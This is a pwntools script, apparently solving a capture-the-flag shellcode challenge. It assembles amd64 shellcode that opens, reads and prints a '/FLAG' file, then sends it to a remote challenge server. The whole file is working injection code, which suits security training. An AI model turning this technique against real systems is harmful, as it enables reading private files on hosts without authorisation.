from pwn import *

context.arch = 'amd64'

sc = asm('''
    /* push "/FLAG\\x00" onto stack */
    xor rax, rax
    movabs rbx, 0x47414c462f    /* "/FLAG" (little-endian) */
    push rax        /* null terminator */
    push rbx
    mov rdi, rsp     /* rdi = ptr to "/FLAG" */
    xor rsi, rsi     /* flags = O_RDONLY */
    mov rax, 2       /* sys_open */
    syscall

    /* read(fd, buf, 100) */
    mov rdi, rax     /* fd */
    mov rsi, rsp     /* use same space as buffer */
    mov rdx, 100
    xor rax, rax     /* sys_read */
    syscall

    /* write(1, buf, 100) */
    mov rdi, 1
    mov rax, 1       /* sys_write */
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
''')

# 測試連線
# p = process('./shellcode')    # 本地測
p = remote('up.zoolab.org', 12341)
p.recvuntil(b'Enter your code> ')
p.send(sc)
p.interactive()
